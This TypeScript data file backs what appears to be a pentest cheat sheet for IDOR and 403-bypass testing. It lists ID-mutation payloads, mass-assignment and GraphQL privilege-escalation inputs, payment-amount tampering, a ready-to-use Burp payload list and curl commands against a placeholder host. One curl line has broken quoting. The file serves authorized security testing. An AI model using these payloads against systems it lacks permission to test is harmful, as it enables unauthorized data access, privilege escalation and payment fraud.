export interface IDORStep {
  id: string
  title: string
  description: string
  commands: { command: string; description: string }[]
  tools?: { name: string; url: string; description: string }[]
  tips?: string[]
}

export const idorSteps: IDORStep[] = [
  {
    id: "note",
    title: "Important Note",
    description:
      "This document is for authorized security testing and CTF use only. Do not use on systems you do not have permission to test.",
    commands: [],
    tips: [
      "Always obtain proper authorization before testing",
      "Use on systems you have explicit permission to test",
      "Keep detailed logs of all testing activities",
    ],
  },
  {
    id: "quick-usage",
    title: "Quick Usage",
    description:
      "Follow this methodology for effective IDOR and 403 bypass testing.",
    commands: [
      {
        command: "Record a baseline: HTTP status, content-length, and response body for a legitimate request",
        description: "Step 1 - Establish baseline",
      },
      {
        command: "Test one mutation at a time and observe differences",
        description: "Step 2 - Test mutations",
      },
      {
        command: "Use Burp, replay tools, Intruder, or automation scripts to rapidly iterate permutations",
        description: "Step 3 - Automate testing",
      },
    ],
    tips: [
      "Always record baseline before making changes",
      "Compare HTTP status, content-length, and response body",
      "Use diff tools to identify subtle differences",
    ],
  },
  {
    id: "basic-mutation",
    title: "1) Basic Mutation Variants",
    description: "Try simple changes to the ID field inside JSON, forms, or query string.",
    commands: [
      { command: '{"user":{"id":123}}', description: "Basic numeric ID" },
      { command: '{"user":{"id":"123"}}', description: "String ID" },
      { command: '{"user":{"id":"0123"}}', description: "Leading zero" },
      { command: '{"user":{"id": 123 }}', description: "Spaces inside" },
      { command: '{"user":{"id":9223372036854775807}}', description: "Max integer value" },
      { command: '{"user":{"id":-123}}', description: "Negative ID" },
    ],
    tips: [
      "Watch for HTTP status changes",
      "Compare content-length differences",
      "Look for body diffs in responses",
    ],
  },
  {
    id: "parameter-pollution",
    title: "2) Duplicate / Parameter Pollution",
    description: "Send the same parameter in multiple places or duplicate keys inside JSON.",
    commands: [
      { command: "GET /endpoint?user[id]=123 (with JSON body user[id]=456)", description: "Query vs body conflict" },
      { command: '{"user":{"id":123}, "user":{"id":456}}', description: "Duplicate keys in JSON" },
      { command: '{"user":{"id":123}, "data":{"user":{"id":456}}}', description: "Nested duplicate keys" },
    ],
    tips: [
      "Auth layer may read one instance while read layer reads another",
      "Test all permutations of duplicate parameters",
      "Use Burp Intruder for bulk testing",
    ],
  },
  {
    id: "alternate-fields",
    title: "3) Alternate Field Names & Indirection",
    description: "Try alternative field names that may map to the same backend field.",
    commands: [
      { command: '{"user":{"id":123}}', description: "Standard field" },
      { command: '{"user":{"user_id":123}}', description: "user_id alternative" },
      { command: '{"user":{"customer_id":123}}', description: "customer_id alternative" },
      { command: '{"actor_id":123}', description: "actor_id field" },
      { command: '{"owner":123}', description: "owner field" },
    ],
    tips: [
      "Backend may use different field names for the same data",
      "Check API documentation for field mappings",
      "Test all possible field variations",
    ],
  },
  {
    id: "content-type",
    title: "4) Content-Type / Parser Confusion",
    description: "Change the Content-Type header and send the same structure in different formats.",
    commands: [
      { command: 'curl -X POST -H "Content-Type: application/json" -d \'{"user":{"id":123}}\' https://target.com/endpoint', description: "JSON format" },
      { command: 'curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user[id]=123" https://target.com/endpoint', description: "Form URL encoded" },
      { command: 'curl -X POST -H "Content-Type: multipart/form-data" -d \'{"user":{"id":123}}\' https://target.com/endpoint', description: "Multipart form data" },
    ],
    tips: [
      "Different parsers may handle data differently",
      "Test all Content-Type variations",
      "Look for parsing differentials",
    ],
  },
  {
    id: "encoding",
    title: "5) Encoding & Canonicalization Tricks",
    description: "Encoding may make the value interpreted differently or bypass filters.",
    commands: [
      { command: "URL encode: /users/%31%32%33", description: "Percent encoded IDs" },
      { command: "Double encode: %2531%2532%2533", description: "Double percent encoding" },
      { command: "Base64 wrapper: {\"id\":\"MTIz\"}", description: "Base64 encoded value" },
      { command: "Percent-encoded inside JSON: {\"id\":\"%31%32%33\"}", description: "Percent encoded JSON" },
    ],
    tips: [
      "Test various encoding methods",
      "Backend may decode differently than expected",
      "Try multiple encoding layers",
    ],
  },
  {
    id: "unicode-homoglyphs",
    title: "6) Hidden Characters & Unicode Homoglyphs",
    description: "Insert zero-width characters or lookalike digits to confuse string checks.",
    commands: [
      { command: '{"user":{"id":"123"}}   # zero-width space', description: "Zero-width space injection" },
      { command: '{"user":{"id":"١٢٣"}}', description: "Arabic-Indic digits" },
      { command: '{"user":{"id":"١23"}}', description: "Mixed digits" },
    ],
    tips: [
      "Unicode characters may bypass validation",
      "Test homoglyphs for common letters",
      "Use online tools to generate homoglyphs",
    ],
  },
  {
    id: "numeric-edge",
    title: "7) Numeric Edge Cases & Type Coercion",
    description: "Try large integers, negatives, and scientific notation.",
    commands: [
      { command: '{"user":{"id":9223372036854775807}}', description: "Maximum integer" },
      { command: '{"user":{"id":-1}}', description: "Negative ID" },
      { command: '{"user":{"id":4.03e2}}', description: "Scientific notation" },
      { command: '{"user":{"id":"403"}}', description: "String number" },
    ],
    tips: [
      "Type coercion may cause unexpected behavior",
      "Try boundary values",
      "Test for integer overflow scenarios",
    ],
  },
  {
    id: "path-body",
    title: "8) Path vs Body Mismatch",
    description: "Send conflicting IDs in the URL path and request body.",
    commands: [
      { command: "GET /users/123 (body: {\"user\":{\"id\":456}})", description: "Path vs body conflict" },
      { command: "POST /orders/999 (body: {\"order\":{\"id\":1000}})", description: "Order ID mismatch" },
    ],
    tips: [
      "One value may be used for auth, another for retrieval",
      "Test URL path parameters separately from body",
      "Check if both are validated",
    ],
  },
  {
    id: "mass-assignment",
    title: "9) Mass-assignment / Object Mapping",
    description: "Target ORM binding by sending additional properties or nested objects.",
    commands: [
      { command: '{"user":{"id":123, "is_admin":true}}', description: "Admin privilege escalation" },
      { command: '{"user":{"id":123, "profile":{"owner_id":456}}}', description: "Nested owner mapping" },
      { command: '{"user":{"id":123, "attributes":{"role":"admin"}}}', description: "Role attribute injection" },
    ],
    tools: [
      { name: "Mass Assignment Scanner", url: "https://github.com/inspiring/mass-assignment", description: "Tool to detect mass assignment vulnerabilities" },
    ],
    tips: [
      "Backend may bind arbitrary fields into DB model",
      "Look for is_admin, role, or permission fields",
      "Test with common privilege escalation fields",
    ],
  },
  {
    id: "nested-references",
    title: "10) Nested / Indirect References",
    description: "Change inner references inside arrays or nested objects.",
    commands: [
      { command: '{"id":123, "references":[{"id":456}]}', description: "Nested reference" },
      { command: '-> {"id":123, "references":[{"id":789}]}', description: "Modified reference" },
    ],
    tips: [
      "Ownership checks may not traverse nested references",
      "Test arrays and nested objects",
      "Check each level of nesting",
    ],
  },
  {
    id: "graphql",
    title: "11) GraphQL-style Probes",
    description: "If the endpoint accepts JSON queries, try varying IDs within the query field.",
    commands: [
      { command: '{ "query": "{ user(id:123) { name } }" }', description: "Basic GraphQL query" },
      { command: '{ "query": "{ user(id:456) { name } }" }', description: "Different user ID" },
      { command: '{ "query": "mutation { updateUser(id:123, isAdmin:true) { id } }" }', description: "Privilege escalation mutation" },
    ],
    tips: [
      "Observe differences between resolvers",
      "Check field-level authorization",
      "Test both queries and mutations",
    ],
  },
  {
    id: "race-conditions",
    title: "12) Race Conditions / TOCTOU",
    description: "Send concurrent requests to exploit Time-of-Check-Time-of-Use vulnerabilities.",
    commands: [
      { command: "1. POST to change resourceA ownership", description: "Step 1 - Modify resource" },
      { command: "2. Immediately GET resourceA using manipulated ID", description: "Step 2 - Access with changed ID" },
    ],
    tips: [
      "Use concurrency tools or scripts",
      "Try to trigger race windows",
      "Test with different timing intervals",
    ],
  },
  {
    id: "empty-fields",
    title: "13) Empty / Omitted Fields",
    description: "Send empty JSON or omit fields to test validators and error handling.",
    commands: [
      { command: "{}", description: "Empty JSON" },
      { command: '{"user":{}}', description: "Empty user object" },
      { command: '{"id":null}', description: "Null ID value" },
    ],
    tips: [
      "Test how application handles empty data",
      "Check for null pointer issues",
      "Observe error message differences",
    ],
  },
  {
    id: "whitespace",
    title: "14) Whitespace & Concatenation Tests",
    description: "Insert spaces, newlines, or padding inside values.",
    commands: [
      { command: '{"id":"123 "}', description: "Trailing space" },
      { command: '{"id":" 123 "}', description: "Surrounded by spaces" },
      { command: '{"id":"123\\n"}', description: "Newline injection" },
    ],
    tips: [
      "Whitespace may bypass string validation",
      "Test for trimming issues",
      "Check if whitespace is stripped",
    ],
  },
  {
    id: "email-subaddressing",
    title: "15) Subaddressing / Plus Tagging",
    description: "Test email subaddressing for bypass or routing manipulation.",
    commands: [
      { command: "user+tag@example.com", description: "Plus tagging" },
      { command: "user%2Btag@example.com", description: "URL encoded plus" },
    ],
    tips: [
      "Email routing may be affected by plus tags",
      "Some apps validate email differently",
      "Test for account takeover possibilities",
    ],
  },
  {
    id: "domain-host",
    title: "16) Domain / Host Edge Cases",
    description: "Use localhost, IP variations, or domain mutations to test hostname validation.",
    commands: [
      { command: "localhost", description: "Localhost" },
      { command: "127.0.0.1", description: "Loopback IP" },
      { command: ".example.com", description: "Dot prefix subdomain" },
      { command: "0x7f000001", description: "Hex IP encoding" },
    ],
    tips: [
      "Test hostname validation logic",
      "Look for DNS rebinding issues",
      "Try various IP representations",
    ],
  },
  {
    id: "payment-bypass",
    title: "17) Payment-specific Tests",
    description: "Amount manipulation techniques for payment bypass.",
    commands: [
      { command: '{"amount":403}', description: "Numeric amount" },
      { command: '{"amount":"403"}', description: "String amount" },
      { command: '{"amount":4.03e2}', description: "Scientific notation" },
      { command: '{"amount":-403}', description: "Negative amount" },
      { command: '{"amount":40300, "currency":"cents"}', description: "Currency unit confusion" },
      { command: '{"amount":403, "productId":456}', description: "Product ID manipulation" },
    ],
    tips: [
      "Check if server recalculates price from productId",
      "Test for currency conversion issues",
      "Look for integer overflow in amounts",
    ],
  },
  {
    id: "payloads",
    title: "Ready-to-use Payloads List",
    description: "Copy these payloads for Burp Intruder or wfuzz testing.",
    commands: [
      { command: "123", description: "Basic number" },
      { command: "\"123\"", description: "Quoted number" },
      { command: "0123", description: "Leading zeros" },
      { command: "9223372036854775807", description: "Max integer" },
      { command: "-1", description: "Negative" },
      { command: "4.03e2", description: "Scientific notation" },
      { command: "MTIz", description: "Base64 encoded" },
      { command: "%31%32%33", description: "Percent encoded" },
      { command: "%2531%2532%2533", description: "Double percent encoded" },
      { command: '{"id":123}', description: "JSON object" },
      { command: '{"user":{"id":123}}', description: "Nested JSON" },
      { command: 'user[id]=123', description: "Form encoded" },
      { command: '{"user":{"id":123}, "user":{"id":456}}', description: "Duplicate keys" },
      { command: '{"user":{"user_id":123}}', description: "Alternative field" },
      { command: '{"user":{"id":123, "is_admin":true}}', description: "Privilege escalation" },
    ],
    tips: [
      "Use as {{PAYLOAD}} in Burp Intruder",
      "Replace ID values in requests",
      "Test each payload systematically",
    ],
  },
  {
    id: "curl-examples",
    title: "Quick Curl Examples",
    description: "Ready-to-use curl commands for testing.",
    commands: [
      { command: 'curl -X POST -H "Content-Type: application/json" -d \'{"user":{"id":123}}\' https://target.com/endpoint', description: "JSON POST" },
      { command: 'curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user[id]=123" https://target.com/endpoint', description: "Form URL encoded" },
      { command: "curl -X POST 'https://target.com/endpoint?user[id]=123' -H 'Content-Type: application/json' -d '{\"user\":{\"id\":456}}'", description: "Query vs body" },
      { command: "curl -X POST -H 'Content-Type: application/json' -d '$'{\"user\":{\"id\":\"123\"}}' https://target.com/endpoint", description: "With whitespace" },
    ],
    tips: [
      "Modify URLs and payloads for your target",
      "Add authentication headers as needed",
      "Use -v flag for verbose output",
    ],
  },
  {
    id: "methodology",
    title: "Testing Methodology",
    description: "Follow this skeptical approach for comprehensive testing.",
    commands: [
      { command: "Capture baseline (status, length, body)", description: "Step 1 - Record baseline" },
      { command: "Change one variable at a time", description: "Step 2 - Test individually" },
      { command: "Compare diffs using diff, jq -C, or automated tools", description: "Step 3 - Analyze differences" },
      { command: "Try combined permutations", description: "Step 4 - Test combinations" },
      { command: "Keep detailed logs of every attempt", description: "Step 5 - Document results" },
    ],
    tips: [
      "Always test systematically",
      "Document every test and result",
      "Use automation for large payload sets",
    ],
  },
]